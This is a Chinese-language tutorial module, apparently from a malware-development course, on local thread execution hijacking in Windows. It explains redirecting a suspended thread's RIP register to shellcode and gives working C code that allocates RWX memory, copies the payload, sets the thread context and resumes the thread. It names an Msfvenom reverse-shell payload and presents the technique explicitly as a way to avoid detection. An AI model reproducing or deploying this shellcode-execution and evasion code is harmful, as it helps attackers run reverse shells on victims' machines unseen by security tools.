模块 35 - 线程劫持 - 局部线程创建

线程执行劫持 是一种无需创建新线程即可执行有效载荷的技术。该技术的运作方式是挂起线程并更新寄存器（指向内存中下一条指令），使其指向有效载荷的开头。当线程恢复执行时，将执行有效载荷。

本模块将使用 Msfvenom TCP 反向 shell 有效载荷，而不是 calc 有效载荷。使用反向 shell 有效载荷是因为它在执行后使线程继续运行，而 calc 有效载荷会在执行后终止线程。无论如何，这两个有效载荷都可以运行，但在执行后仍保持线程运行，以便进行进一步分析。

线程上下文

在解释此技术之前，必须先理解 "线程上下文"。每个线程都有一个调度优先级，并维护一组结构，这些结构由系统保存到线程的上下文中。线程上下文包括线程恢复执行所需的所有信息，包括线程的 CPU 寄存器和堆栈集合。

GetThreadContext 和 SetThreadContext 是两个分别用于获取和设置线程上下文的 WinAPI。

GetThreadContext 填充了 CONTEXT 结构，该结构包含有关线程的所有信息。而 SetThreadContext 会获取一个已填充的 CONTEXT 结构，并将其设置为指定的线程。

这两个 WinAPI 在线程劫持中将发挥至关重要的作用，因此回顾一下 WinAPI 及其相关参数将很有益处。

线程劫持与线程创建

首先需要解决的问题是，为什么劫持创建的线程来执行有效载荷，而不是使用新创建的线程执行有效载荷。

主要区别在于有效载荷暴露和隐蔽性。为有效载荷执行创建新线程将暴露有效载荷的基地址，从而暴露有效载荷的内容，因为新线程的入口必须指向有效载荷在内存中的基地址。而线程劫持则不会出现这种情况，因为线程的入口将指向正常进程函数，因此该线程看起来是良性的。

CreateThread WinAPI

CreateThread 的第三个参数 LPTHREAD_START_ROUTINE lpStartAddress 指明线程入口的地址。使用线程创建，lpStartAddress 将指向有效载荷的地址。另一方面，线程劫持会指向一个良性函数。

HANDLE CreateThread(
  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
  [in]            SIZE_T                  dwStackSize,
  [in]            LPTHREAD_START_ROUTINE  lpStartAddress, // 线程入口
  [in, optional]  __drv_aliasesMem LPVOID lpParameter,
  [in]            DWORD                   dwCreationFlags,
  [out, optional] LPDWORD                 lpThreadId
);

本地线程劫持步骤

本节描述在本地进程中创建的线程上执行线程劫持的必要步骤。

创建目标线程

执行线程劫持的前提是找到要劫持的正在运行的线程。需要注意的是，无法劫持本地进程的主线程，因为目标线程需要首先被置于挂起状态。由于主线程是执行代码的线程并且无法被挂起，因此在执行本地线程劫持时不要将其作为目标。

本模块将演示劫持新创建的线程。CreateThread 函数将首先被调用来创建线程并为线程的入口设置一个良性函数。之后，该线程的句柄将用于执行劫持线程并改为执行有效载荷所需的步骤。

修改线程上下文

下一步是检索线程的上下文，以便修改它并使其指向有效载荷。当线程恢复执行时，有效载荷将被执行。

如前所述，GetThreadContext 将用于检索目标线程的 CONTEXT 结构。结构的某些值将被修改，以使用 SetThreadContext 修改当前线程的上下文。结构中正在更改的值是决定线程下一步执行什么的值。这些值是 RIP（对于 64 位处理器）或 EIP（对于 32 位处理器）寄存器。

RIP 和 EIP 寄存器，也称为 指令指针寄存器，指向要执行的下一条指令。在执行每条指令后它们会被更新。

设置 ContextFlags

注意 GetThreadContext 的第二个参数 lpContext 被标记为 IN & OUT 参数。微软文档中的 备注部分 指出：

该函数基于上下文结构的 ContextFlags 成员的值检索一个选择性上下文。

本质上，微软说明在调用该函数之前必须将 CONTEXT.ContextFlags 设置为一个值。将 ContextFlags 设置为 CONTEXT_CONTROL 标记以检索控制寄存器的值。

因此，将 CONTEXT.ContextFlags 设置为 CONTEXT_CONTROL 是执行线程劫持所必需的。或者，也可以使用 CONTEXT_ALL 来执行线程劫持。

线程劫持函数

RunViaClassicThreadHijacking 是一个执行线程劫持的自定义函数。该函数需要 3 个参数：

  • hThread - 已挂起的待劫持线程的句柄。
  • pPayload - 指向有效载荷基址的指针。
  • sPayloadSize - 有效载荷的大小。
BOOL RunViaClassicThreadHijacking(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

    PVOID    pAddress         = NULL;
    DWORD    dwOldProtection  = NULL;
    CONTEXT  ThreadCtx        = { 
        .ContextFlags = CONTEXT_CONTROL 
    };

    // 分配有效载荷所需的内存
    pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL){
        printf("[!] VirtualAlloc 失败，错误：%d \n", GetLastError());
        return FALSE;
    }

    // 将有效载荷复制到已分配的内存
    memcpy(pAddress, pPayload, sPayloadSize);

    // 更改内存保护
    if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtect 失败，错误：%d \n", GetLastError());
        return FALSE;
    }

    // 获取原始线程上下文
    if (!GetThreadContext(hThread, &ThreadCtx)){
        printf("[!] GetThreadContext 失败，错误：%d \n", GetLastError());
        return FALSE;
    }

    // 更新下一个指令指针与有效载荷地址相等
    ThreadCtx.Rip = pAddress;

    // 更新新线程上下文
    if (!SetThreadContext(hThread, &ThreadCtx)) {
        printf("[!] SetThreadContext 失败，错误：%d \n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

创建牺牲线程

由于 RunViaClassicThreadHijacking 需要一个线程句柄，因此主函数需要提供该句柄。如前所述，目标线程需要处于挂起状态，以便 RunViaClassicThreadHijacking 能够成功劫持线程。

我们将使用 CreateThread WinAPI 来创建一个新线程。新线程应该尽可能表现得良性，以避免被检测到。这可以通过创建一个良性函数来实现，该函数由这个新创建的线程执行。

下一步是挂起新创建的线程，以便 GetThreadContext 成功。这可以通过两种方式实现：

  1. 在 CreateThread 的 dwCreationFlags 参数 中传递 CREATE_SUSPENDED 标志。该标志将创建处于挂起状态的线程。
  2. 创建一个普通线程，但稍后使用 SuspendThread WinAPI 将其挂起。

我们将使用第一种方法，因为它使用较少的 WinAPI 调用。但是，两种方法都要求在执行 RunViaClassicThreadHijacking 后恢复线程。这将使用 ResumeThread WinAPI 来实现，它只需要挂起线程的句柄。

main 函数

重申一下，main 函数将创建一个暂停状态的牺牲线程。该线程最初将运行一个良性的空函数，然后使用 RunViaClassicThreadHijacking 劫持该函数来运行有效负载。

int main() {

  HANDLE hThread = NULL;
  // 创建暂停状态的牺牲线程
  hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE) &DummyFunction, NULL, CREATE_SUSPENDED, NULL);
  if (hThread == NULL) {
    printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
    return FALSE;
  }
  // 劫持创建的牺牲线程
  if (!RunViaClassicThreadHijacking(hThread, Payload, sizeof(Payload))) {
    return -1;
  }
  // 恢复暂停线程，以便它运行我们的 shellcode
  ResumeThread(hThread);

  printf("[#] Press <Enter> To Quit ... ");
  getchar();
  return 0;
}
